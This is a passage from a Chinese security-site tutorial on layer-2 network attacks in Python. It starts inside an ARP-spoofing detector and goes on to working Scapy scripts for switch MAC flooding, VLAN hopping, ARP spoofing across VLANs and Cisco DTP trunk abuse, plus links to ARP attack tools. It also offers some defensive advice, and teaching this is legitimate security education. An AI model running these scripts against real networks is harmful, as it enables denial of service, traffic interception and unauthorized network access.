&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pkt[ARP].psrc
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip_mac[pkt[ARP].psrc]&nbsp;=&nbsp;pkt[ARP].hwsrc&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Device&nbsp;is&nbsp;known&nbsp;but&nbsp;has&nbsp;a&nbsp;different&nbsp;IP
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;ip_mac.get(pkt[ARP].psrc)&nbsp;and&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip_mac[pkt[ARP].psrc]&nbsp;!=&nbsp;pkt[ARP].hwsrc:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;pkt[ARP].hwsrc&nbsp;+&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&nbsp;has&nbsp;got&nbsp;new&nbsp;ip&nbsp;&quot;&nbsp;+&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pkt[ARP].psrc&nbsp;+&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&nbsp;(old&nbsp;&quot;&nbsp;+&nbsp;ip_mac[pkt[ARP].psrc]&nbsp;+&nbsp;&quot;)&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip_mac[pkt[ARP].psrc]&nbsp;=&nbsp;pkt[ARP].hwsrc&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
signal(SIGINT,&nbsp;sig_int_handler)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
if&nbsp;len(sys.argv)&nbsp;&lt;&nbsp;2:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;sys.argv[0]&nbsp;+&nbsp;&quot;&nbsp;&lt;iface&gt;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(0)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
try:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fh&nbsp;=&nbsp;open(arp_watcher_db_file,&nbsp;&quot;r&quot;)
except&nbsp;IOError:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Cannot&nbsp;read&nbsp;file&nbsp;&quot;&nbsp;+&nbsp;arp_watcher_db_file
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(1)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
for&nbsp;line&nbsp;in&nbsp;fh:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;line.chomp()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(ip,&nbsp;mac)&nbsp;=&nbsp;line.split(&quot;&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip_mac[ip]&nbsp;=&nbsp;mac&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
sniff(prn=watch_arp,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filter=&quot;arp&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iface=sys.argv[1],
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;store=0)</pre><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;开始我们定义了一个信号处理函数sig_int_handler()，当用户中断程序时该函数会被调用。该函数会在ip_mac字典中，将所有已知的IP和MAC地址对应关系保存到一个文件当中。一开始我们读取这些ARP db文件，用目前已知的所有对应关系来初始化程序，若文件无法读取则退出。然后我们将文件内容一行一行地循环读取，把每一行分割为IP和MAC地址，将它们保存到 ip_mac字典中。我们再调用已知的sniff()函数，对每一个接收到的ARP数据包，调用回调函数watch_arp。<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;watch_arp函数是整个程序中的核心逻辑部分。当嗅探到的数据包是is-at数据包时，则该数据包为一个ARP响应。紧接着我们首先检查IP是否存在于ip_mac字典中。如果我们没有发现对应条目，则其为一个新设备，并在屏幕上显示一条信息。否则我们将数据包中的MAC地址与字典中的MAC相比较，如果不同则响应很可是伪造的，我们也在屏幕上显示一条消息。在这两种情况下，都会用新的信息来更新字典。<br/><strong><br/></strong></span></p><p><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>0x04 MAC-Flooder</strong></span></p><hr/><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">交换机和其他计算机一样，具有有限的内存，交换机中存放MAC地址信息的表格也同样如此，该表格记录哪个MAC地址对应哪个端口及其内部的ARP缓存。当交换机的缓冲区溢出时，它们的反应就会有些古怪。这将会导致交换机拒绝服务，以至于放弃交换行为而变得像正常的集线器。在集线器模式下，整体的高流量不会是你遇到的唯一问题，因此在没有附加操作下，所有已连接的计算机都会接收到完整的流量。你应该测试一下的你的交换机在这种意外情况下是如何反应的，接下来的脚本就可以做到这一点。它会产生随机的MAC地址，并将它们发送到你的交换机中，直到交换机的缓冲区被填满。</span><br/></p><pre class="brush:python;toolbar:false">#!/usr/bin/python&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
import&nbsp;sys
from&nbsp;scapy.all&nbsp;import&nbsp;*&nbsp;&nbsp;&nbsp;
&nbsp;
packet&nbsp;=&nbsp;Ether(src=RandMAC(&quot;*:*:*:*:*:*&quot;),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dst=RandMAC(&quot;*:*:*:*:*:*&quot;))&nbsp;/&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP(src=RandIP(&quot;*.*.*.*&quot;),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dst=RandIP(&quot;*.*.*.*&quot;))&nbsp;/&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ICMP()&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
if&nbsp;len(sys.argv)&nbsp;&lt;&nbsp;2:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dev&nbsp;=&nbsp;&quot;eth0&quot;
else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dev&nbsp;=&nbsp;sys.argv[1]&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
print&nbsp;&quot;Flooding&nbsp;net&nbsp;with&nbsp;random&nbsp;packets&nbsp;on&nbsp;dev&nbsp;&quot;&nbsp;+&nbsp;dev&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
sendp(packet,&nbsp;iface=dev,&nbsp;loop=1)</pre><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RandMAC和RandIP负责随机地产生地址当中的每一个字节。其余的则由sendp()函数的循环参数完成。</span></p><p><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong><br/></strong></span></p><p><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>0x05 VLAN Hopping</strong></span></p><hr/><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">因为VLAN不具备安全特性，一方面标记VLAN取决于包含VLAN id的数据包头部，使用Scapy可以很容易创建这样的数据包。现在让我们的电脑连接到VLAN1，并且尝试去ping VLAN2上的其他主机。</span><br/></p><pre class="brush:python;toolbar:false">#!/usr/bin/python&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
from&nbsp;scapy.all&nbsp;import&nbsp;*&nbsp;&nbsp;&nbsp;
&nbsp;
packet&nbsp;=&nbsp;Ether(dst=&quot;c0:d3:de:ad:be:ef&quot;)&nbsp;/&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dot1Q(vlan=1)&nbsp;/&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dot1Q(vlan=2)&nbsp;/&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP(dst=&quot;192.168.13.3&quot;)&nbsp;/&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ICMP()&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
sendp(packet)</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先我们设定在数据包的头部当中，包含我们的VLAN标记，再加上一个目的主机地址。交换机将会移除第一个标记，并不决定如何处理该数据包，当它看到第二个标记VLAN id 2 的时候，则决定转发到这个vlan。如果交换机连接到其他通过堆叠启用的VLAN交换机，这种攻击只会是成功的，否则它们就是使用的基于端口的VLAN。</span><br/></p><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;"><strong><br/></strong></span></p><p><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>0x06 Let’s Play Switch</strong></span></p><hr/><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">Linux可以运行在许多嵌入式网络设备上；因此凭借Linux操作系统，人们可以把自己的电脑变成一台功能齐全的VALN交换机，这并不令人惊奇。你只需要vconfig这种工具就够了。在根据你的操作系统安装所需的数据包后，通过以下的命令，你可以将你的主机加入到另一个VLAN环境中。<br/></span></p><pre class="brush:bash;toolbar:false">vconfig&nbsp;add&nbsp;eth0&nbsp;1</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">然后你必须记住启动新设备，并给它一个VLAN网络中的IP地址。<br/></span><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;"></span></p><pre class="brush:bash;toolbar:false">ifconfig&nbsp;eth0.1&nbsp;192.168.13.23&nbsp;up</pre><p><br/></p><p><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>0x07 ARP Spoofing Over VLAN Hopping</strong></span></p><hr/><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">VLAN会限制对同一VLAN的端口的广播流量，因此我们不能在默认情况下应对所有的ARP请求，就像在第一个ARP spoofing例子中看到的那样，必须每隔几秒就向受害者告诉我们的MAC地址。除了我们对每个数据包进行了标记和加之的目的VLAN，下面的代码是通用的。</span><br/></p><pre class="brush:python;toolbar:false">#!/usr/bin/python&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
import&nbsp;time
from&nbsp;scapy.all&nbsp;import&nbsp;sendp,&nbsp;ARP,&nbsp;Ether,&nbsp;Dot1Q&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
iface&nbsp;=&nbsp;&quot;eth0&quot;
target_ip&nbsp;=&nbsp;&#39;192.168.13.23&#39;
fake_ip&nbsp;=&nbsp;&#39;192.168.13.5&#39;
fake_mac&nbsp;=&nbsp;&#39;c0:d3:de:ad:be:ef&#39;
our_vlan&nbsp;=&nbsp;1
target_vlan&nbsp;=&nbsp;2&nbsp;&nbsp;&nbsp;
&nbsp;
packet&nbsp;=&nbsp;Ether()&nbsp;/&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dot1Q(vlan=our_vlan)&nbsp;/&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dot1Q(vlan=target_vlan)&nbsp;/&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ARP(hwsrc=fake_mac,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pdst=target_ip,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;psrc=fake_ip,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;op=&quot;is-at&quot;)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
while&nbsp;True:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendp(packet,&nbsp;iface=iface)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(10)</pre><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;幸运的是，防御这种类型的VLAN攻击并没有那么复杂：如果你真的想分离你的网络，只需要使用物理划分的交换机！<br/><strong><br/></strong></span></p><p><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>0x08 DTP Abusing</strong></span></p><hr/><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TP（动态中继协议）是一种由思科发明的专有协议，用于如果一个端口是trunk端口，则交换机之间可以动态地交流。Trunk端口通常用于互连交换机和路由器，以便共享一些或所有已知的VLAN。<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了能够执行下面的代码，你需要安装Scapy的开发版本。同时为了check out出源，请先安装Mercurial，然后键入以下命令来克隆Scapy repository。<br/></span><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;"></span></p><pre class="brush:bash;toolbar:false">hg&nbsp;clone&nbsp;http://hg.secdev.org/scapy&nbsp;scapy</pre><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果你想跟踪Scapy的最新版本，你只需要时不时地更新checkout。<br/></span><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;"></span></p><pre class="brush:bash;toolbar:false">cd&nbsp;scapy
hg&nbsp;pull</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">现在你可以将旧版本的Scapy变成最新版的了。<br/></span><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;"></span></p><pre class="brush:bash;toolbar:false">pip&nbsp;uninstall&nbsp;Scapy
cd&nbsp;scapy
python&nbsp;setup.py&nbsp;install</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">多亏了DTP协议，和它完全忽视任何一种安全的属性，我们现在就可以发送一个动态可取包到每一个启用DTP的思科设备，并要求它将我们的端口转变为trunk端口。</span><br/></p><pre class="brush:python;toolbar:false">#!/usr/bin/python&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
import&nbsp;sys
from&nbsp;scapy.layers.l2&nbsp;import&nbsp;Dot3&nbsp;,&nbsp;LLC,&nbsp;SNAP
from&nbsp;scapy.contrib.dtp&nbsp;import&nbsp;*&nbsp;&nbsp;&nbsp;
&nbsp;
if&nbsp;len(sys.argv)&nbsp;&lt;&nbsp;2:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;sys.argv[0]&nbsp;+&nbsp;&quot;&nbsp;&lt;dev&gt;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
negotiate_trunk(iface=sys.argv[1])</pre><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;作为一个可选参数，你可以设置欺骗相邻交换机的MAC地址，如果没有设置，则会自动生成一个随机值。<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种攻击可能会持续几分钟，但是攻击者并不关心延迟，因为他们知道在改变连接到每一个VLAN的可能性之后他们会得到什么！<br/></span><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;"></span></p><pre class="brush:bash;toolbar:false">vconfig&nbsp;add&nbsp;eth0&nbsp;&lt;vlan-id&gt;
ifconfig&nbsp;eth0.&lt;vlan-id&gt;&nbsp;&lt;ip_of_vlan&gt;&nbsp;up</pre><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;没有足够好的理由来使用DTP，所以干脆禁用掉它吧！<br/><strong><br/></strong></span></p><p><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>0x09 Tools</strong></span><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;"><br/></span></p><hr/><pre class="brush:bash;toolbar:false">&nbsp;&nbsp;&nbsp;&nbsp;NetCommander</pre><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NetCommander是一个简单的ARP欺骗程序。它通过对每一个可能的IP发送ARP请求，来搜索网络上存活的主机。你可以选择需要劫持的连接，然后每隔几秒，NetCommander就会自动地欺骗那些主机和默认网关之间的双向连接。<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工具的源代码可以从这里下载：https://github.com/evilsocket/NetCommander<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hacker’s Hideaway ARP Attack Tool<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hacker’s Hideaway ARP Attack Tool比NetCommander的功能多一些。除了欺骗特殊连接，它还支持被动欺骗所有对源IP的ARP请求，和MAC泛洪攻击。<br/>工具的下载链接为：https://packetstormsecurity.org/files/81368/hharp.py.tar.bz2<br/></span><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;"></span></p><pre class="brush:bash;toolbar:false">&nbsp;&nbsp;&nbsp;&nbsp;Loki</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">Loki是一种像Yersinia的第二层和第三层攻击工具。它可以通过插件来扩展，也有一个漂亮的GUI界面。它实现了像ARP欺骗和泛洪，BGP，RIP路由注入之类的攻击，甚至可以攻击像HSRP和VRRP那样非常罕见的协议。<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工具的源代码地址为：https://www.c0decafe.de/loki.html</span><br/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文转载自 drops.wooyun.org<br/><a class="text-more" href="http://drops.wooyun.org/tips/8547" target="_blank">原文链接：http://drops.wooyun.org/tips/8547</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="Python网络攻防之第二层攻击 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="662" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="64d932c9bb50dc5a83db601d9b02e735">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
                                <li><a href="/learning/detail/4424.html" alt="【知识】9月16日 - 每日安全知识热点" target="_blank">【知识】9月16日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
